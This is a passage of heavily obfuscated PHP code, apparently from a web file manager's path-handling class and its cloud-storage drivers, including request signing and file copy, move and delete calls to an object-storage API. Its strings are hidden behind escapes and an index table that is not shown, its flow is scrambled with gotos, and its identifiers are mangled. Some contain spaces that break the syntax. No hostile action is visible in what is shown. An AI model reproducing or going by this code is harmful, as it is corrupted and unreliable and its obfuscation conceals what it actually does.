KOD_USER_SHARE_LINK = "\173\x75\x73\x65\x72\x53\x68\x61\162\145\114\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\x65\124\x6f\115\145\175"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\x72\x65\x49\164\x65\x6d\175"; const KOD_SHARE_LINK = "\x7b\x73\150\x61\x72\x65\x49\x74\145\155\x4c\x69\156\153\x7d"; const KOD_SEARCH = "\x7b\163\145\x61\162\x63\x68\175"; const KOD_BLOCK = "\x7b\142\154\157\x63\153\175"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\173\165\163\x65\x72\122\145\156\143\x65\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\166\x65\x72\x7d"; public static function typeList() { $Fãõ³Šå‰’ =& $_SERVER[µ…]; return array($Fãõ³Šå‰’[1115] => self::KOD_SOURCE, $Fãõ³Šå‰’[1116] => self::KOD_USER_RECYCLE, $Fãõ³Šå‰’[1117] => self::KOD_USER_FAV, $Fãõ³Šå‰’[1118] => self::KOD_USER_FILE_TAG, $Fãõ³Šå‰’[1119] => self::KOD_USER_FILE_TYPE, $Fãõ³Šå‰’[1120] => self::KOD_GROUP_ROOT_SELF, $Fãõ³Šå‰’[1121] => self::KOD_USER_SHARE, $Fãõ³Šå‰’[1122] => self::KOD_USER_SHARE_LINK, $Fãõ³Šå‰’[1123] => self::KOD_USER_SHARE_TO_ME, $Fãõ³Šå‰’[1124] => self::KOD_SHARE_ITEM, $Fãõ³Šå‰’[1125] => self::KOD_SHARE_LINK, $Fãõ³Šå‰’[1126] => self::KOD_SEARCH, $Fãõ³Šå‰’[1127] => self::KOD_BLOCK, $Fãõ³Šå‰’[1128] => self::KOD_IO, $Fãõ³Šå‰’[1129] => self::KOD_USER_RECENT, $Fãõ³Šå‰’[1130] => self::KOD_USER_DRIVER); } public static function parse($f’¨Õğ¨æ) { goto FòŞßµ…óª; eˆİŒÙÊë: preg_match($AßÜ²˜ºŠœ[1131], $f’¨Õğ¨æ, $F®ÒíŠÃ‹ä); $b²Œàˆ”¾ö = array($AßÜ²˜ºŠœ[409] => !1, $AßÜ²˜ºŠœ[1132] => !1, $AßÜ²˜ºŠœ[406] => !1, $AßÜ²˜ºŠœ[75] => $f’¨Õğ¨æ, $AßÜ²˜ºŠœ[1042] => !1, $AßÜ²˜ºŠœ[1041] => $AßÜ²˜ºŠœ[33]); if (is_array($F®ÒíŠÃ‹ä) && count($F®ÒíŠÃ‹ä) == 5) { $DŒ·®Ü = $AßÜ²˜ºŠœ[1133] . $F®ÒíŠÃ‹ä[2] . $AßÜ²˜ºŠœ[323]; if (in_array($DŒ·®Ü, $f‡óİà÷´Æ)) { $b²Œàˆ”¾ö[$AßÜ²˜ºŠœ[1042]] = $F®ÒíŠÃ‹ä[1]; $b²Œàˆ”¾ö[$AßÜ²˜ºŠœ[29]] = $DŒ·®Ü; $b²Œàˆ”¾ö[$AßÜ²˜ºŠœ[1134]] = substr($DŒ·®Ü, 1, -1); $b²Œàˆ”¾ö[$AßÜ²˜ºŠœ[388]] = $F®ÒíŠÃ‹ä[3]; } $b²Œàˆ”¾ö[$AßÜ²˜ºŠœ[1041]] = $F®ÒíŠÃ‹ä[4]; } goto AÅ•‹´ê¼‹; FòŞßµ…óª: $AßÜ²˜ºŠœ =& $_SERVER[µ…]; $f’¨Õğ¨æ = self::clear($f’¨Õğ¨æ); $f‡óİà÷´Æ = array_values(self::typeList()); goto eˆİŒÙÊë; AÅ•‹´ê¼‹: $C£Ÿ±–ÄÒè = array($AßÜ²˜ºŠœ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $b²Œàˆ”¾ö[$AßÜ²˜ºŠœ[1096]] = in_array($b²Œàˆ”¾ö[$AßÜ²˜ºŠœ[29]], $C£Ÿ±–ÄÒè); return $b²Œàˆ”¾ö; goto fÈÄ¬œ¿Ğ·; fÈÄ¬œ¿Ğ·: } public static function isTruePath($D¡Ã†ÂËæ‘) { goto Fø”òá•ÀÙ; cÙÑõÇÛ®½: if (strpos($D¡Ã†ÂËæ‘, $CÁÛ¼†¸‡Ü[1099]) === 0) { return !0; } if (strpos($D¡Ã†ÂËæ‘, $CÁÛ¼†¸‡Ü[1135]) === 0) { return !0; } if (strpos($D¡Ã†ÂËæ‘, $CÁÛ¼†¸‡Ü[1135]) === 0) { return !0; } goto DÀé¿ÚºÙ¶; Fø”òá•ÀÙ: $CÁÛ¼†¸‡Ü =& $_SERVER[µ…]; if (substr($D¡Ã†ÂËæ‘, 0, 1) != $CÁÛ¼†¸‡Ü[1133]) { return !0; } if (strpos($D¡Ã†ÂËæ‘, $CÁÛ¼†¸‡Ü[395]) === 0) { return !0; } goto cÙÑõÇÛ®½; DÀé¿ÚºÙ¶: if (strpos($D¡Ã†ÂËæ‘, $CÁÛ¼†¸‡Ü[1136]) === 0) { return !0; } return !1; goto b„åîÄĞó‘; b„åîÄĞó‘: } public static function clear($cì¼×÷˜…‚) { goto eôîòˆÔã•; eôîòˆÔã•: $cµÀÄù›Ã =& $_SERVER[µ…]; $cì¼×÷˜…‚ = str_replace(array($cµÀÄù›Ã[1015], $cµÀÄù›Ã[227]), $cµÀÄù›Ã[50], $cì¼×÷˜…‚); $cì¼×÷˜…‚ = str_replace($cµÀÄù›Ã[96], $cµÀÄù›Ã[8], $cì¼×÷˜…‚); goto DğÇÂïŠÀ; DãŸƒíÇ«à: $cì¼×÷˜…‚ = preg_replace($cµÀÄù›Ã[1139], $cµÀÄù›Ã[8], $cì¼×÷˜…‚); if ($cì¼×÷˜…‚ == $cµÀÄù›Ã[8]) { return $cµÀÄù›Ã[8]; } $cì¼×÷˜…‚ = rtrim($cì¼×÷˜…‚, $cµÀÄù›Ã[8]); goto E•ôì—õã; DğÇÂïŠÀ: $Fàäƒõ…Š = $cµÀÄù›Ã[1137]; if (substr($cì¼×÷˜…‚, 0, 3) == $cµÀÄù›Ã[1138]) { $cì¼×÷˜…‚ = substr($cì¼×÷˜…‚, 3); } while (strstr($cì¼×÷˜…‚, $Fàäƒõ…Š)) { $cì¼×÷˜…‚ = str_replace($Fàäƒõ…Š, $cµÀÄù›Ã[8], $cì¼×÷˜…‚); } goto DãŸƒíÇ«à; E•ôì—õã: return $cì¼×÷˜…‚; goto eœí¿ó§İÆ; eœí¿ó§İÆ: } public static function sourceID($F¦éÎÕÂóğ) { $B¥³Ç‹âïØ =& $_SERVER[µ…]; $A ¸„„“¢° = self::parse($F¦éÎÕÂóğ); if ($A ¸„„“¢°[$B¥³Ç‹âïØ[29]] !== self::KOD_SOURCE) { show_json(LNG($B¥³Ç‹âïØ[1140]), !1); } return $A ¸„„“¢°[$B¥³Ç‹âïØ[388]]; } public static function make($eß™é„¨¹È) { if (!$eß™é„¨¹È) { return !1; } return self::makePath(self::KOD_SOURCE, intval($eß™é„¨¹È)); } public static function makeShare($b”øÓâ¯­§, $bÚÖÀ«Üô“) { return self::makePath(self::KOD_SHARE_ITEM, $b”øÓâ¯­§, $bÚÖÀ«Üô“); } public static function makeFileTypePath($CÊŸ¥®ø¢¨) { return self::makePath(self::KOD_USER_FILE_TYPE, $CÊŸ¥®ø¢¨); } public static function makeFileTagPath($fĞÕ¬ß¥‚) { return self::makePath(self::KOD_USER_FILE_TAG, $fĞÕ¬ß¥‚); } public static function makePath($F¸˜¿»®, $F¢œ”Ìøà = '', $EîÕÆË®© = '') { $b©Ã—ùíÄ =& $_SERVER[µ…]; $f˜¢ğç¯­İ = substr($F¸˜¿»®, 1, -1); $Dƒ‰‹¾áã = $b©Ã—ùíÄ[1141] . $f˜¢ğç¯­İ . $b©Ã—ùíÄ[1142] . $F¢œ”Ìøà . $b©Ã—ùíÄ[1143]; $Dƒ‰‹¾áã = $EîÕÆË®© ? $Dƒ‰‹¾áã . $EîÕÆË®© . $b©Ã—ùíÄ[8] : $Dƒ‰‹¾áã; return $Dƒ‰‹¾áã; } public static function hashPath($c÷£¿ìœ˜Œ) { $fœß¹õø =& $_SERVER[µ…]; $FíšÑŸñ˜Š = is_array($c÷£¿ìœ˜Œ) ? $c÷£¿ìœ˜Œ : IO::info($c÷£¿ìœ˜Œ); $Dë˜”µíí = _get($FíšÑŸñ˜Š, $fœß¹õø[1144], $fœß¹õø[33]); if (!$Dë˜”µíí) { $a‹½í„Èˆå = KodIO::parse($FíšÑŸñ˜Š[$fœß¹õø[75]]); if (!$a‹½í„Èˆå[$fœß¹õø[29]]) { $Dë˜”µíí = IO::hashSimple($FíšÑŸñ˜Š[$fœß¹õø[75]]); } } if (!$Dë˜”µíí) { $Dë˜”µíí = md5($FíšÑŸñ˜Š[$fœß¹õø[75]] . $FíšÑŸñ˜Š[$fœß¹õø[77]] . $FíšÑŸñ˜Š[$fœß¹õø[83]]); } return $Dë˜”µíí; } public static function initSystemPath() { goto F ö«çŒ±; DÀÃ‰²¯Ùê: define($CçÊ » ¸ç[1147], self::systemPath($CçÊ » ¸ç[1148])); define($CçÊ » ¸ç[1149], self::systemPath($CçÊ » ¸ç[1150])); define($CçÊ » ¸ç[1151], self::systemPath($CçÊ » ¸ç[1152])); goto eÜ×ƒéÖ¾; F ö«çŒ±: $CçÊ » ¸ç =& $_SERVER[µ…]; if (defined($CçÊ » ¸ç[1145])) { return; } define($CçÊ » ¸ç[1145], self::systemPath($CçÊ » ¸ç[1146])); goto DÀÃ‰²¯Ùê; eÜ×ƒéÖ¾: IOHistory::bindEvent(); goto a¦«÷ÒÃ§Ÿ; a¦«÷ÒÃ§Ÿ: } public static function systemPath($F‰÷§É…‹) { goto eˆœÄÀÏã; bµ‚ññ¨œß: return $C®´Œ³—³; goto Eíª‹ÕÈ¯¬; AìçôÎî±¢: if ($C®´Œ³—³) { return $C®´Œ³—³; } if ($F‰÷§É…‹ == $dº™Á“¹ñÛ[1146]) { $C®´Œ³—³ = self::make(Model($dº™Á“¹ñÛ[769])->systemRootPathAdd($dº™Á“¹ñÛ[500])); } else { $C®´Œ³—³ = self::systemPath($dº™Á“¹ñÛ[1146]); $aÔŠ¡ä¡˜÷ = self::sourceID($C®´Œ³—³); $C®´Œ³—³ = self::make(Model($dº™Á“¹ñÛ[769])->mkdir($aÔŠ¡ä¡˜÷, $F‰÷§É…‹)); } Model($dº™Á“¹ñÛ[1101])->set($Cã˜Ğáœ÷è, $C®´Œ³—³); goto bµ‚ññ¨œß; eˆœÄÀÏã: $dº™Á“¹ñÛ =& $_SERVER[µ…]; $Cã˜Ğáœ÷è = $dº™Á“¹ñÛ[1153] . ucfirst($F‰÷§É…‹); $C®´Œ³—³ = Model($dº™Á“¹ñÛ[1101])->get($Cã˜Ğáœ÷è); goto AìçôÎî±¢; Eíª‹ÕÈ¯¬: } public static function systemFolder($c—·È¬¼ÑÂ) { $AÓÏƒ‚¯©× = IO_PATH_SYSTEM_SOURCE . $c—·È¬¼ÑÂ; $eŒ±·“ğ” = Cache::get($AÓÏƒ‚¯©×); if (!$eŒ±·“ğ”) { $AÎŠ®‹Ã¸‰ = IO::infoFull($AÓÏƒ‚¯©×); if (!$AÎŠ®‹Ã¸‰) { $eŒ±·“ğ” = IO::mkdir($AÓÏƒ‚¯©×, REPEAT_SKIP); } else { $eŒ±·“ğ” = $AÎŠ®‹Ã¸‰[$_SERVER[µ…][75]]; } Cache::set($AÓÏƒ‚¯©×, $eŒ±·“ğ”, 3600 * 10); } return $eŒ±·“ğ”; } public static function defaultDriver() { return Model($_SERVER[µ…][718])->defaultDriver(); } public static function defaultIO() { $FŒ—†‰ÀÆš =& $_SERVER[µ…]; $cé™Š™ÃÜ = self::defaultDriver(); return $FŒ—†‰ÀÆš[1154] . $cé™Š™ÃÜ[$FŒ—†‰ÀÆš[388]] . $FŒ—†‰ÀÆš[1143]; } public static function defaultDriverInit() { static $F‰ï±ä»ËÅ = false; if ($F‰ï±ä»ËÅ) { return $F‰ï±ä»ËÅ; } $F‰ï±ä»ËÅ = IO::init(self::defaultIO()); return $F‰ï±ä»ËÅ; } public static function fileTypeList() { $cá±³äâ =& $_SERVER[µ…]; $cŒÂÆÂ¦…ê = $GLOBALS[$cá±³äâ[6]][$cá±³äâ[1155]]; foreach ($cŒÂÆÂ¦…ê as $B®–ğªÌ¬ø => $a›®Å¤Ÿ„) { $Eç±å¡ï•Õ = $cá±³äâ[1156] . $B®–ğªÌ¬ø; $Døš ©…¯Ø = LNG($Eç±å¡ï•Õ); if ($Eç±å¡ï•Õ != $Døš ©…¯Ø) { $cŒÂÆÂ¦…ê[$B®–ğªÌ¬ø][$cá±³äâ[28]] = $Døš ©…¯Ø; } } return $cŒÂÆÂ¦…ê; } public static function transferType($DŞ£Æ÷ßˆ¿, $Eí‘½©ˆ“) { goto Aø³Ÿ—¯Ÿ; d»Ç»²×†Ã: return $E £†çŒ„ë[1159]; goto A›³©÷Ø„; F—óñË–æ’: if ($A›ÃÏ¶‰™Œ[$E £†çŒ„ë[29]] == $c”Æõ‰ßˆÂ[$E £†çŒ„ë[29]] && $A›ÃÏ¶‰™Œ[$E £†çŒ„ë[1157]] == $c”Æõ‰ßˆÂ[$E £†çŒ„ë[1157]]) { return $E £†çŒ„ë[1158]; } if ($A›ÃÏ¶‰™Œ[$E £†çŒ„ë[29]] == $E £†çŒ„ë[802] && $c”Æõ‰ßˆÂ[$E £†çŒ„ë[29]] == $E £†çŒ„ë[105]) { return $E £†çŒ„ë[1071]; } if ($A›ÃÏ¶‰™Œ[$E £†çŒ„ë[29]] == $E £†çŒ„ë[105] && $c”Æõ‰ßˆÂ[$E £†çŒ„ë[29]] == $E £†çŒ„ë[802]) { return $E £†çŒ„ë[106]; } goto d»Ç»²×†Ã; Aø³Ÿ—¯Ÿ: $E £†çŒ„ë =& $_SERVER[µ…]; $A›ÃÏ¶‰™Œ = self::driverType($DŞ£Æ÷ßˆ¿); $c”Æõ‰ßˆÂ = self::driverType($Eí‘½©ˆ“); goto F—óñË–æ’; A›³©÷Ø„: } public static function driverType($d‰ØíïáÇ£) { goto B¿Îôæ­İê; CÉá–ñÓÜ: if ($fƒ±İİ°¹¹ == $DƒÚ•­ÆÄ[709] || $fƒ±İİ°¹¹ == $DƒÚ•­ÆÄ[1161] || $fƒ±İİ°¹¹ == $DƒÚ•­ÆÄ[1162]) { $d‰ØíïáÇ£ = self::defaultDriverInit(); } else { if ($fƒ±İİ°¹¹ == $DƒÚ•­ÆÄ[1078] || $fƒ±İİ°¹¹ == $DƒÚ•­ÆÄ[1163]) { $d‰ØíïáÇ£ = IO::init($d‰ØíïáÇ£->pathParse[$DƒÚ•­ÆÄ[1025]]); } } $fƒ±İİ°¹¹ = str_replace($DƒÚ•­ÆÄ[1160], $DƒÚ•­ÆÄ[33], strtolower($d‰ØíïáÇ£->getType())); if ($fƒ±İİ°¹¹ == $DƒÚ•­ÆÄ[105]) { return array($DƒÚ•­ÆÄ[29] => $DƒÚ•­ÆÄ[105], $DƒÚ•­ÆÄ[1157] => $DƒÚ•­ÆÄ[33], $DƒÚ•­ÆÄ[75] => $DÊ“âæ½); } goto C¥¥‡ÀÉŸ; C¥¥‡ÀÉŸ: return array($DƒÚ•­ÆÄ[29] => $DƒÚ•­ÆÄ[802], $DƒÚ•­ÆÄ[1157] => $d‰ØíïáÇ£->pathDriver, $DƒÚ•­ÆÄ[75] => $DÊ“âæ½); goto bÑ§‚°íÄ·; B¿Îôæ­İê: $DƒÚ•­ÆÄ =& $_SERVER[µ…]; $DÊ“âæ½ = $d‰ØíïáÇ£->path; $fƒ±İİ°¹¹ = str_replace($DƒÚ•­ÆÄ[1160], $DƒÚ•­ÆÄ[33], strtolower($d‰ØíïáÇ£->getType())); goto CÉá–ñÓÜ; bÑ§‚°íÄ·: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($cÄÊå—áÛ) { parent::__construct($cÄÊå—áÛ); $this->signatureVersion($_SERVER[µ…][210]); } public function uploadFormData($dóòÍ®í ³, $aŒŒŠ¤‹•Ç = 3600) { goto e¬¡÷Ô¤‹ß; Aë³Ì©òˆî: $d–Ù£àÂÌâ = $cøÑçÀ¦ô²[1164]; $BÄĞªÉæÌÕ = gmdate($cøÑçÀ¦ô²[1165], time() + $aŒŒŠ¤‹•Ç); $Bíôšˆ£‹ = (string) time() . $cøÑçÀ¦ô²[67] . (string) (time() + $aŒŒŠ¤‹•Ç); goto B·Š¥ÑŠœ¿; EØØ£ªõ•À: $Bİ“ƒ¼°Œ = sha1($E¢¿·ˆ‘); $CÏŞ®±ºŠö = hash_hmac($cøÑçÀ¦ô²[228], $Bİ“ƒ¼°Œ, $A¹Í£¥ô‰â); $AŞÎê×Ç§Î = array($cøÑçÀ¦ô²[1168] => $C‰í¨¢ÈèÀ, $cøÑçÀ¦ô²[1172] => $d–Ù£àÂÌâ, $cøÑçÀ¦ô²[1176] => base64_encode($E¢¿·ˆ‘), $cøÑçÀ¦ô²[1173] => $BİóùÃ›ÜÏ, $cøÑçÀ¦ô²[1174] => $this->accessKey, $cøÑçÀ¦ô²[1177] => $Bíôšˆ£‹, $cøÑçÀ¦ô²[1178] => $CÏŞ®±ºŠö, $cøÑçÀ¦ô²[174] => $this->getHost()); goto F ×‹ÒÛ½; F ×‹ÒÛ½: return $AŞÎê×Ç§Î; goto E§“Àİ‹; B·Š¥ÑŠœ¿: $E¢¿·ˆ‘ = array($cøÑçÀ¦ô²[1166] => $BÄĞªÉæÌÕ, $cøÑçÀ¦ô²[1167] => array(array($cøÑçÀ¦ô²[1168] => $C‰í¨¢ÈèÀ), array($cøÑçÀ¦ô²[1169] => $this->bucket), array($cøÑçÀ¦ô²[1170], $cøÑçÀ¦ô²[1171], $cøÑçÀ¦ô²[33]), array($cøÑçÀ¦ô²[1172] => $d–Ù£àÂÌâ), array($cøÑçÀ¦ô²[1173] => $BİóùÃ›ÜÏ), array($cøÑçÀ¦ô²[1174] => $this->accessKey), array($cøÑçÀ¦ô²[1175] => $Bíôšˆ£‹))); $E¢¿·ˆ‘ = json_encode($E¢¿·ˆ‘); $A¹Í£¥ô‰â = hash_hmac($cøÑçÀ¦ô²[228], $Bíôšˆ£‹, $this->secret); goto EØØ£ªõ•À; e¬¡÷Ô¤‹ß: $cøÑçÀ¦ô² =& $_SERVER[µ…]; $C‰í¨¢ÈèÀ = $cøÑçÀ¦ô²[190]; $BİóùÃ›ÜÏ = $cøÑçÀ¦ô²[228]; goto Aë³Ì©òˆî; E§“Àİ‹: } public function fileOutLink($f†í‰Æƒˆ) { $EŠî§¥øÓµ =& $_SERVER[µ…]; if (substr($f†í‰Æƒˆ, 0, 7) == $EŠî§¥øÓµ[1179]) { $f†í‰Æƒˆ = $EŠî§¥øÓµ[1180] . substr($f†í‰Æƒˆ, 7); } header($EŠî§¥øÓµ[158] . $f†í‰Æƒˆ); die; } } goto A’‚ÓÌ¯¹; dŸÜÑ»°¸: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\x70\72\57\x2f\x76\60\56\141\160\x69\x2e\x75\160\171\165\156\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($d›Îâ–é…ó) { parent::__construct(); $this->_init($d›Îâ–é…ó); } public function _init($aÁÂÎˆ½°) { $aíˆÜöÔÔÓ =& $_SERVER[µ…]; foreach ($aÁÂÎˆ½° as $F•áÙ«Èƒ³ => $Eª™ÙÖÄš§) { if (isset($this->{$F•áÙ«Èƒ³})) { $this->{$F•áÙ«Èƒ³} = $Eª™ÙÖÄš§; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($aíˆÜöÔÔÓ[1308] . LNG($aíˆÜöÔÔÓ[1240])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Fá†âÍ—¶ª, $Bòâ‰îî¢© = "\107\105\x54") { $b¸¨İÌôœ¬ =& $_SERVER[µ…]; $aµŞÃ¨»° = gmdate($b¸¨İÌôœ¬[1274]); $fÚ·®¡ˆ¸ = base64_encode(hash_hmac($b¸¨İÌôœ¬[1309], "{$Bòâ‰îî¢©}\x26{$Fá†âÍ—¶ª}\46{$aµŞÃ¨»°}", md5("{$this->userpass}"), !0)); $CõªïØğ¡„ = array("\101\165\164\150\157\x72\x69\x7a\141\x74\x69\x6f\156\72\125\120\131\125\116\40{$this->username}\x3a{$fÚ·®¡ˆ¸}", "\x44\141\x74\145\x3a{$aµŞÃ¨»°}"); return $CõªïØğ¡„; } public function ussRequest($fá¦Ê¥¼«º, $c†ÄôôÔÂÌ = "\107\x45\124", $D¶çŒ‹…   = false, $bºëÀº³° = false, $C…ßÎ¤ùÚï = false) { goto Dôôù¤“Ìä; Dôôù¤“Ìä: $e ¤Åµª„Ğ =& $_SERVER[µ…]; $fá¦Ê¥¼«º = trim($fá¦Ê¥¼«º, $e ¤Åµª„Ğ[8]); $e—¶è±£è¬ = "\x2f{$this->bucket}\57{$fá¦Ê¥¼«º}"; goto c‰ªâ†ù‰; déªÙö×Š: if (!$a‡°›»ßšÓ) { return array($e ¤Åµª„Ğ[1063] => !1, $e ¤Åµª„Ğ[1065] => $e ¤Åµª„Ğ[1310]); } if (strtolower($c†ÄôôÔÂÌ) == $e ¤Åµª„Ğ[189] || in_array($a‡°›»ßšÓ[$e ¤Åµª„Ğ[1063]], array($e ¤Åµª„Ğ[1164], $e ¤Åµª„Ğ[1311]))) { $D¶çŒ‹…   = $a‡°›»ßšÓ[$e ¤Åµª„Ğ[1312]]; } else { $D¶çŒ‹…   = json_decode($a‡°›»ßšÓ[$e ¤Åµª„Ğ[1065]], !0); if (!$D¶çŒ‹…  ) { $D¶çŒ‹…   = $a‡°›»ßšÓ[$e ¤Åµª„Ğ[1065]]; } else { if (!$a‡°›»ßšÓ[$e ¤Åµª„Ğ[704]] && isset($D¶çŒ‹…  [$e ¤Åµª„Ğ[1313]])) { $D¶çŒ‹…   = $D¶çŒ‹…  [$e ¤Åµª„Ğ[1313]]; } } } return array($e ¤Åµª„Ğ[1063] => $a‡°›»ßšÓ[$e ¤Åµª„Ğ[704]], $e ¤Åµª„Ğ[1065] => $D¶çŒ‹…  ); goto B²¢…ÂÜ½©; c‰ªâ†ù‰: $F‘à²•˜Şé = $this->ussHeaders($e—¶è±£è¬, $c†ÄôôÔÂÌ); if ($bºëÀº³°) { $F‘à²•˜Şé = array_merge($F‘à²•˜Şé, $bºëÀº³°); } $a‡°›»ßšÓ = url_request($this->endpoint . $e—¶è±£è¬, $c†ÄôôÔÂÌ, $D¶çŒ‹…  , $F‘à²•˜Şé, $C…ßÎ¤ùÚï); goto déªÙö×Š; B²¢…ÂÜ½©: } public function mkfile($DŠ™ÂÃ£¡¦, $c²†‘¼¥°’ = '', $B£¨¤äôé = REPEAT_RENAME) { if ($this->setContent($DŠ™ÂÃ£¡¦, $c²†‘¼¥°’)) { return $this->getPathOuter($DŠ™ÂÃ£¡¦); } return !1; } public function mkdir($dà‘Œ÷‡­ô, $c‰¶†©Ï‚ù = REPEAT_SKIP) { $E£˜Í·¿¤Ğ =& $_SERVER[µ…]; $a‹…ÅÑÔ± = trim($dà‘Œ÷‡­ô, $E£˜Í·¿¤Ğ[8]); if ($this->_isFolder($a‹…ÅÑÔ±)) { return $this->getPathOuter($a‹…ÅÑÔ±); } $F¾Ñ†øÑíµ = array($E£˜Í·¿¤Ğ[1314]); $d›°îááÆÉ = $this->ussRequest($a‹…ÅÑÔ±, $E£˜Í·¿¤Ğ[222], !1, $F¾Ñ†øÑíµ); return $d›°îááÆÉ[$E£˜Í·¿¤Ğ[1063]] ? $this->getPathOuter($a‹…ÅÑÔ±) : !1; } public function copyFile($aŠ„Ÿù®ùß, $bêø£ÔÚ÷) { $AÃ‚„‹… =& $_SERVER[µ…]; $eÄğ¥ÜæŸ = array($AÃ‚„‹…[1315] . "\57{$this->bucket}\x2f{$aŠ„Ÿù®ùß}", $AÃ‚„‹…[1316]); $b¶­»ƒÑ¥í = $this->ussRequest($bêø£ÔÚ÷, $AÃ‚„‹…[224], !1, $eÄğ¥ÜæŸ); return $b¶­»ƒÑ¥í[$AÃ‚„‹…[1063]] ? !0 : $this->getPathOuter($bêø£ÔÚ÷); } public function moveFile($Aè½‚÷ÁÄ•, $d²ŸÚÍ²ã) { $D‚º„ÂŒ†Ã =& $_SERVER[µ…]; $E´ŸÍ¹¾† = array($D‚º„ÂŒ†Ã[1317] . "\57{$this->bucket}\57{$Aè½‚÷ÁÄ•}", $D‚º„ÂŒ†Ã[1316]); $eÈî±ŞîÌ = $this->ussRequest($d²ŸÚÍ²ã, $D‚º„ÂŒ†Ã[224], !1, $E´ŸÍ¹¾†); return $eÈî±ŞîÌ[$D‚º„ÂŒ†Ã[1063]] ? !0 : $this->getPathOuter($d²ŸÚÍ²ã); } public function delFile($Bì¼Š‚”œÍ) { $E²¯“¶å“ =& $_SERVER[µ…]; $b™¯Œ ÚÔ¹ = $this->ussRequest($Bì¼Š‚”œÍ, $E²¯“¶å“[1318]); return $b™¯Œ ÚÔ¹[$E²¯“¶å“[1063]] ? !0 : !1; } public function delFolder($F‘ŞÀòÛÎ) { goto DÜó¥Ñ‰Ó; e‡ÄÊº‰³¹: return $Cš…Şö ö[$CÅóÉî¨Ì×[1063]]; goto cğ ƒŠÀ; c¾ŸÅ©Â„®: $Fƒ†Ì¬éˆ = $dé—”î¼¯¿ = array(); $this->fileList($F‘ŞÀòÛÎ, $Fƒ†Ì¬éˆ, $dé—”î¼¯¿, !0); $this->listItemCache = !0; goto BÖ¼µĞ¿£©; DÜó¥Ñ‰Ó: $CÅóÉî¨Ì× =& $_SERVER[µ…]; if (!$this->exist($F‘ŞÀòÛÎ)) { return !0; } $this->listItemCache = !1; goto c¾ŸÅ©Â„®; BÖ¼µĞ¿£©: foreach ($dé—”î¼¯¿ as $AäËàöÌƒÎ) { $Cš…Şö ö = $this->ussRequest($AäËàöÌƒÎ[$CÅóÉî¨Ì×[28]], $CÅóÉî¨Ì×[1318]); if (!$Cš…Şö ö[$CÅóÉî¨Ì×[1063]]) { return !1; } } foreach ($Fƒ†Ì¬éˆ as $C²°ÃŞ±¤÷) { $Cš…Şö ö = $this->ussRequest($C²°ÃŞ±¤÷, $CÅóÉî¨Ì×[1318]); if (!$Cš…Şö ö[$CÅóÉî¨Ì×[1063]]) { return !1; } } $Cš…Şö ö = $this->ussRequest($F‘ŞÀòÛÎ, $CÅóÉî¨Ì×[1318]); goto e‡ÄÊº‰³¹; cğ ƒŠÀ: } public function rename($f¡é°ëáåá, $FÉŒ£ ’ºÓ) { if ($this->isFile($f¡é°ëáåá)) { $FÉŒ£ ’ºÓ = get_path_father($f¡é°ëáåá) . $FÉŒ£ ’ºÓ; return $this->moveFile($f¡é°ëáåá, $FÉŒ£ ’ºÓ); } return $this->renameObject($f¡é°ëáåá, $FÉŒ£ ’ºÓ); } public function fileInfo($BÂÃ›‘¹Èì, $eâØ¶İ¬ªÕ = false, $aÖĞİÆ¾ = array()) { goto bµÑÀÏÂÃŒ; D²Ùª´œóá: return $D¡‡Ò°×¿; goto cçµá§İô; aÀŠ° ‘: $D¡‡Ò°×¿[$AĞçÌ§º„õ[192]] = intval($aÖĞİÆ¾[$AĞçÌ§º„õ[1319]]); $D¡‡Ò°×¿[$AĞçÌ§º„õ[83]] = intval($aÖĞİÆ¾[$AĞçÌ§º„õ[1320]]); $D¡‡Ò°×¿[$AĞçÌ§º„õ[77]] = $aÖĞİÆ¾[$AĞçÌ§º„õ[77]]; goto D²Ùª´œóá; cÆÀÒ…æõĞ: $D¡‡Ò°×¿[$AĞçÌ§º„õ[192]] = $D¡‡Ò°×¿[$AĞçÌ§º„õ[83]] = 0; $D¡‡Ò°×¿[$AĞçÌ§º„õ[193]] = $D¡‡Ò°×¿[$AĞçÌ§º„õ[194]] = !0; if (empty($aÖĞİÆ¾)) { $aÖĞİÆ¾ = $this->objectMeta($BÂÃ›‘¹Èì); if (!$aÖĞİÆ¾) { return $D¡‡Ò°×¿; } } goto aÀŠ° ‘; bµÑÀÏÂÃŒ: $AĞçÌ§º„õ =& $_SERVER[µ…]; $D¡‡Ò°×¿ = array($AĞçÌ§º„õ[28] => $this->pathThis($BÂÃ›‘¹Èì), $AĞçÌ§º„õ[75] => $this->getPathOuter($AĞçÌ§º„õ[8] . $BÂÃ›‘¹Èì), $AĞçÌ§º„õ[29] => $AĞçÌ§º„õ[191], $AĞçÌ§º„õ[77] => isset($aÖĞİÆ¾[$AĞçÌ§º„õ[77]]) ? $aÖĞİÆ¾[$AĞçÌ§º„õ[77]] : 0, $AĞçÌ§º„õ[167] => $this->ext($BÂÃ›‘¹Èì)); if ($eâØ¶İ¬ªÕ) { return $D¡‡Ò°×¿; } goto cÆÀÒ…æõĞ; cçµá§İô: } public function folderInfo($c¶Æİ¯ì‰, $A’õ°•Æó = false) { goto a‚Ÿ¯è‚ß; a‚Ÿ¯è‚ß: $bÃˆå­È¹Î =& $_SERVER[µ…]; $cªØºÓŠ‚Ï = array($bÃˆå­È¹Î[28] => $this->pathThis($c¶Æİ¯ì‰), $bÃˆå­È¹Î[75] => $this->getPathOuter($bÃˆå­È¹Î[8] . $c¶Æİ¯ì‰), $bÃˆå­È¹Î[29] => $bÃˆå­È¹Î[76]); if ($A’õ°•Æó) { return $cªØºÓŠ‚Ï; } goto C‰‡õ£Ÿ‚©; C‰‡õ£Ÿ‚©: $cªØºÓŠ‚Ï[$bÃˆå­È¹Î[192]] = $cªØºÓŠ‚Ï[$bÃˆå­È¹Î[83]] = 0; 